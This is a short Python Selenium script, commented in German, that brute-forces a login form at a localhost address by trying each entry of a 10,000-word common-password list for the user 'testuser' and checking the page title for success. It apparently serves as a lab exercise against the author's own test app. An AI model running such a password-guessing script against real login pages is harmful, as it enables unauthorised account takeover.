from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time

from webdriver_manager.chrome import ChromeDriverManager

# Den chromedriver braucht man womöglich gar nicht, daher automatisch bezogen wird in neuer selenium version
#s = Service(executable_path="chromedriver.exe")

#chrome_options = Options()
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)

website = "http://127.0.0.1:5000/login"
driver.get(website)



#passwords=["sdsdgaf", "change", "pass", "asgfasdg"]
# Passwörter aus Passwortliste UTF-8 encoden und jede Zeile wird in Array gespeichert als Arrayobjekt
with open('10k-most-common.txt', encoding='utf-8') as file:
    passwords = [line.strip() for line in file if line.strip()]

for passwd in passwords:

    print(f"trying {passwd}")

    # Eingabefelder und Button holen
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")
    login_button = driver.find_element(By.CLASS_NAME, "btn-selen")

    # Felder leeren und neu befüllen
    username_field.clear()
    password_field.clear()
    #username_field.send_keys("Derk")
    username_field.send_keys("testuser")
    password_field.send_keys(passwd)

    login_button.click()
    time.sleep(0.5) # Kurze Pause, damit Seite laden kann

    print(driver.title)

    # Passwort erfolgreich, wenn wir nicht mehr auf der Login-Seite sind
    if driver.title != "Login":
        print(f"[SUCCESS] Password found. Password was: < {passwd} >")
        break
    else:
        print(f"[FAIL] Wrong Password")

    # Zurück zur Login-Seite (nur nötig, wenn die Seite sich wirklich neu lädt oder umleitet)
    driver.get(website)

driver.quit()
